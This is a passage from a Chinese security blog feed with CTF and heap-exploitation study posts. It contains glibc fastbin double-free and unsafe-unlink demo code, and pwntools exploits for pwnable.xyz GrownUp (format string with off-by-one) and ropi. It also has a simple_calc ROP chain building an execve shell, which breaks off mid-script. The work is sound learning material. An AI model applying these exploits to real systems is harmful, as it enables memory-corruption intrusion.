class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. "</span></span><br><span class="line">		<span class="string">"We'll now carry out our attack by modifying data at %p.\n"</span>, a, b, a, a);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, d);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p ].\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we have access to %p while it remains at the head of the free list.\n"</span></span><br><span class="line">		<span class="string">"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"</span></span><br><span class="line">		<span class="string">"so that malloc will think there is a free chunk there and agree to\n"</span></span><br><span class="line">		<span class="string">"return a pointer to it.\n"</span>, a);</span><br><span class="line">	stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n"</span>, a);</span><br><span class="line">	*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p, putting the stack address on the free list\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4th malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>输出：</strong><br><img src="/11/cl7iordpg002k293filar99fb/output3.png" alt="output3"></p>
<p><strong>个人总结</strong><br>首先malloc了三次</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br></pre></td></tr></table></figure>

<p>紧接着<code>free a</code> -&gt; <code>free b</code> -&gt; <code>free a</code> </p>
<p>随后<code>d = malloc(8)</code>,这时返回给d的地址与a相同</p>
<p>继续<code>malloc(8)</code>,这时链表结构中只剩下了a，此时a仍在fastbin里是空闲的，但是我们现在已经可以随意修改a的fd指针等其它结构了。</p>
<p><code>*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</code><br>这条语句修改了a中的fd指针使其指向stack中的位置，伪造了一个chunk</p>
<p>再次连续malloc两次我们就可以成功返回栈地址了</p>
<h2 id="0x06-unsafe-unlink"><a href="#0x06-unsafe-unlink" class="headerlink" title="0x06 unsafe_unlink"></a>0x06 unsafe_unlink</h2><p><strong>源码：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Welcome to unsafe unlink 2.0!\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Tested in Ubuntu 14.04/16.04 64bit.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line">	<span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The global chunk0_ptr is at %p, pointing to %p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The victim chunk we are going to corrupt is at %p\n\n"</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We create a fake chunk inside chunk0.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk fd: %p\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk bk: %p\n\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//fprintf(stderr, "We need to make sure the 'size' of our fake chunk matches the 'previous_size' of the next chunk (chunk+size)\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "With this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "P = chunk0_ptr, next_chunk(P) == (mchunkptr) (((char *) (p)) + chunksize (p)) == chunk0_ptr + (chunk0_ptr[1]&amp;(~ 0x7))\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "If x = chunk0_ptr[1] &amp; (~ 0x7), that is x = *(chunk0_ptr + x).\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "We just need to set the *(chunk0_ptr + x) = x, so we can pass the check\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "1.Now the x = chunk0_ptr[1]&amp;(~0x7) = 0, we should set the *(chunk0_ptr + 0) = 0, in other words we should do nothing\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "2.Further more we set chunk0_ptr = 0x8 in 64-bits environment, then *(chunk0_ptr + 0x8) == chunk0_ptr[1], it's fine to pass\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "3.Finally we can also set chunk0_ptr[1] = x in 64-bits env, and set *(chunk0_ptr+x)=x,for example chunk_ptr0[1] = 0x20, chunk_ptr0[4] = 0x20\n");</span></span><br><span class="line">	<span class="comment">//chunk0_ptr[1] = sizeof(size_t);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "In this case we set the 'size' of our fake chunk so that chunk0_ptr + size (%p) == chunk0_ptr-&gt;size (%p)\n", ((char *)chunk0_ptr + chunk0_ptr[1]), &amp;chunk0_ptr[1]);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "You can find the commitdiff of this check at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30\n\n");</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n"</span>);</span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n"</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n"</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n"</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n"</span>);</span><br><span class="line">	<span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Original value: %s\n"</span>,victim_string);</span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"New Value: %s\n"</span>,victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>输出：</strong></p>
<p><img src="/11/cl7iordpg002k293filar99fb/output4.png" alt="output4"></p>
<p><strong>个人总结：</strong></p>
<p>这个攻击方式的条件是要有在bss段上可以覆盖到的全局指针变量</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br></pre></td></tr></table></figure>

<p>首先malloc两次，取得两块chunk</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>然后开始在chunk0中伪造一个chunk P，为了unlink时绕过<code>P-&gt;fd-bk == P &amp;&amp; P-&gt;bk-&gt;fd == P</code>的检测，设置了fd和bk指针。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br></pre></td></tr></table></figure>

<p>fake chunk的size字段和下一个堆块的presize字段(fd-&gt;presize)的值是一样的.</p>
<p>经过了这个设置,就可以过掉“(chunksize(P) != prev_size (next_chunk(P)) == False”的校验了.</p>
<p>因此,我们设置fake chunk的size字段为chunk0_[-3]:0x00000000</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span></span><br><span class="line"><span class="built_in">free</span>(chunk1_ptr);</span><br></pre></td></tr></table></figure>

<p>把chunk1设置为空闲状态，然后free掉chunk1，因为这时chunk0也是处于free状态，且这两个chunk相邻，所以就会unlink我们的fake chunk,然后修改chunk_ptr.</p>
<p>然后我们就可以利用chunk_ptr,自己改自己的值然后实现任意地址写。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>pwnable.xyz GrownUp</title>
    <url>/year/09/05/cl7iordpo002z293f7xr6q2nu/</url>
    <content><![CDATA[<p>一道格式化字符串漏洞题</p>
<a id="more"></a>
<h2 id="寻找漏洞"><a href="#寻找漏洞" class="headerlink" title="寻找漏洞"></a>寻找漏洞</h2><p>题目如下</p>
<p><img src="/05/cl7iordpo002z293f7xr6q2nu/GrownUp.png" alt="题目"></p>
<p>可能溢出的地方有两个：</p>
<ul>
<li>read函数，但是src申请的空间是0x84读入数据限制在了0x80，没有发生溢出。</li>
<li>另一个是strcpy，又观察到下面有一个格式化字符串漏洞，那么就应该是利用这里了</li>
</ul>
<h2 id="寻找利用方法"><a href="#寻找利用方法" class="headerlink" title="寻找利用方法"></a>寻找利用方法</h2><p>现在查看strcpy是否能让usr覆盖掉格式化字符串</p>
<p><img src="/05/cl7iordpo002z293f7xr6q2nu/usr.png" alt="查看偏移"></p>
<p>发现偏移正好是0x80，导致我们无法直接覆盖掉格式化字符串。然后我就感觉。。。。。这个程序明明天衣无缝，根本没有漏洞。</p>
<h2 id="围绕已知漏洞看看是不是漏掉了什么"><a href="#围绕已知漏洞看看是不是漏掉了什么" class="headerlink" title="围绕已知漏洞看看是不是漏掉了什么"></a>围绕已知漏洞看看是不是漏掉了什么</h2><p>先看看字符串里有没有什么信息</p>
<p><img src="/05/cl7iordpo002z293f7xr6q2nu/flag.png" alt="字符串"></p>
<p>好的，发现只要泄露这个地址的字符串就可以拿到flag</p>
<p>然后仔细想一下，其实read函数接受0x80个字符是不包括\0的，然后strcpy复制过后会自动为字符串末尾加上\0。这样就可以覆盖掉 qword_601160 这个地址的后两位。这样格式化字符串的地址就改变到了我们可以控制的位置。其实这就是off-by-one的思想，前几天接触堆的时候看见过不过没有深入。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实这道题的知识点是都会的，就是以前做的栈题都是动辄覆盖返回地址，这道题只溢出了一个字符便没有引起自己足够的重视。下面是这道题的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process('./GrownUpRedist')</span></span><br><span class="line">sh = remote(<span class="string">'svc.pwnable.xyz'</span>,<span class="number">30004</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x601080</span></span><br><span class="line">payload = <span class="string">'y'</span> + <span class="string">'A'</span>*<span class="number">7</span> + p64(flag)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Are you 18 years or older? [y/N]: '</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">format_string = <span class="string">'%p %p %p %p %p %p %p %p %s %p %p %p'</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'A'</span> * <span class="number">32</span> + format_string + <span class="string">'A'</span>*(<span class="number">0x80</span> - len(format_string))</span><br><span class="line">sh.recvuntil(<span class="string">"Name: "</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> sh.recvall()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn题writeup</category>
      </categories>
  </entry>
  <entry>
    <title>lce-ctf 2016 ropi</title>
    <url>/year/09/01/cl7iordpg002h293fgwxb6iar/</url>
    <content><![CDATA[<p>这道rop题主要是考虑到rop链长度不够的问题，还有就是通过pop_ret调整参数位置使得其成功满足函数条件。这道题最大的收获就是做题要耐心，只要耐心思路清晰肯定能发现问题，一定不要急躁。</p>
<a id="more"></a>
<p>第一步还是分析文件格式和保护措施。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] '/home/wood/pwn/i_chunqiu/ROP/lce_Ctf2016/ropi'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ropi: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=5e2ed875c2a5f3b2df94f42bd7f82893b288559f, not stripped</span><br></pre></td></tr></table></figure>

<p>文件32位并且没有PIE，然后先用IDA反汇编可以看到ezy函数中的read函数存在栈溢出。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">ezy</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+10h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Benvenuti al convegno RetOri Pro!\nVuole lasciare un messaggio?"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后观察这个文件里的其它函数，看看有没有什么其它奇怪的函数和system函数以及系统调用等。果然发现了几个很有用的函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">int __cdecl ret(int a1) #打开flag文件</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">0xBADBEEEF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"chiave sbagliata! :("</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fd = open(<span class="string">"./flag.txt"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[+] aperto"</span>);</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">int __cdecl ori(int a1, int a2) #将flag文件内容写入dati中</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">0xABCDEFFF</span> &amp;&amp; a2 != <span class="number">0x78563412</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"chiave sbagliata! :(("</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read(fd, &amp;dati, <span class="number">0x80</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[+] leggi"</span>);</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">int pro() #输出dati中的内容</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[+] stampare"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>, &amp;dati);</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析可知我们只需依次执行这三个函数，就可以拿到flag。然而构造完payload以后发现并没有成功获取flag，这时通过gdb.attach下断点动态调试(一般下在ret处)，通过一些有用的命令（如下）查看内存中数据的情况，我发现了payload超出了read的读入范围，于是分两次payload将这三个函数依次调用，拿到了flag。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stack --100 查看栈上的值</span><br><span class="line">x/20wx $ebp+4 查看该函数的返回地址以及前四个参数</span><br></pre></td></tr></table></figure>

<p>下面是这道题的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./ropi'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line">ret = <span class="number">0x8048569</span></span><br><span class="line">ori = <span class="number">0x80485C4</span></span><br><span class="line">ret_a1 = <span class="number">0xBADBEEEF</span>  <span class="comment">#ret第一个参数</span></span><br><span class="line">ori_a1 = <span class="number">0xABCDEFFF</span>  <span class="comment">#ori第一个参数</span></span><br><span class="line">ori_a2 = <span class="number">0x78563412</span>  <span class="comment">#ori第二个参数</span></span><br><span class="line">pro = <span class="number">0x0804862C</span></span><br><span class="line">ezy = <span class="number">0x804852D</span></span><br><span class="line">pop_ret = <span class="number">0x08048395</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span>             <span class="comment">#先调用ret函数然后返回到ezy函数重新溢出</span></span><br><span class="line">payload += offset * <span class="string">'a'</span></span><br><span class="line">payload += p32(ret)</span><br><span class="line">payload += p32(pop_ret)</span><br><span class="line">payload += p32(ret_a1)</span><br><span class="line">payload += p32(ezy)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Vuole lasciare un messaggio?'</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">''</span>          <span class="comment">#再次溢出调用ori和pro函数</span></span><br><span class="line">payload2 += offset*<span class="string">'a'</span></span><br><span class="line">payload2 += p32(ori)</span><br><span class="line">payload2 += p32(pro)</span><br><span class="line">payload2 += p32(ori_a1)</span><br><span class="line">payload2 += p32(ori_a2)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Vuole lasciare un messaggio?'</span>)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>pwn题writeup</category>
      </categories>
  </entry>
  <entry>
    <title>simple_calc</title>
    <url>/year/08/21/cl7iordq1003y293fa3w5rd4t/</url>
    <content><![CDATA[<p>i春秋上给的课后例题不错，近期打算把这上面的题刷一刷，巩固一下基础。还是一道简单的ROP练习题。</p>
<a id="more"></a>
<p>还是64位文件，保护措施是只开启了NX保护。<br>ida f5反汇编以后查看主函数<br><img src="/21/cl7iordq1003y293fa3w5rd4t/main.png" alt="main"><br>可以看到漏洞主要是在case5处的复制产生了栈溢出，程序里面没有system函数，所以可以先看一下能否使用系统调用<br><img src="/21/cl7iordq1003y293fa3w5rd4t/syscall.png" alt="syscall"><br>我们可以看到果然有syscall命令，这样就可以调用execve(“bin/sh”)函数获取shell，需要满足的条件如下：</p>
<ul>
<li>RAX：59</li>
<li>RDI：RSP</li>
<li>RSI：0</li>
<li>RDX：0<br>我们需要找到下面的gadeget:</li>
<li>pop rax, ret</li>
<li>pop rid, rdx, ret</li>
<li>mov rsi, rsp</li>
<li>syscall<br>脚本如下<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, timeout = <span class="number">1</span>)</span><br><span class="line">io = remote(<span class="string">'172.17.0.3'</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">io.recv()					<span class="comment">#39次计算，ROP的长度</span></span><br><span class="line">io.sendline(<span class="string">'39'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#padding</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>):			</span><br><span class="line">	io.sendline(<span class="string">'2'</span>)</span><br><span class="line">	io.sendline(<span class="string">'42'</span>)</span><br><span class="line">	io.sendline(<span class="string">'42'</span>)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x44db34--&gt;pop rax; ret</span></span><br><span class="line">io.sendline(<span class="string">'1'</span>)</span><br><span class="line">io.sendline(<span class="string">'2256282'</span>)</span><br><span class="line">io.sendline(<span class="string">'2256282'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#地址高32位置0</span></span><br><span class="line">io.sendline(<span class="string">'2'</span>)</span><br><span class="line">io.sendline(<span class="string">'42'</span>)</span><br><span class="line">io.sendline(<span class="string">'42'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x3b--&gt;rax = 0x3b</span></span><br><span class="line">io.sendline(<span class="string">'2'</span>)</span><br><span class="line">io.sendline(<span class="string">'101'</span>)</span><br><span class="line">io.sendline(<span class="string">'42'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#地址高32位置0</span></span><br><span class="line">io.sendline(<span class="string">'2'</span>)</span><br><span class="line">io.sendline(<span class="string">'42'</span>)</span><br><span class="line">io.sendline(<span class="string">'42'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x401c87--&gt;pop rsi; ret</span></span><br><span class="line">io.sendline(<span class="string">'1'</span>)</span><br><span class="line">io.sendline(<span class="string">'2100803'</span>)</span><br><span class="line">io.sendline(<span class="string">'2100804'</span>)</span><br><span class="line">sleep(<span 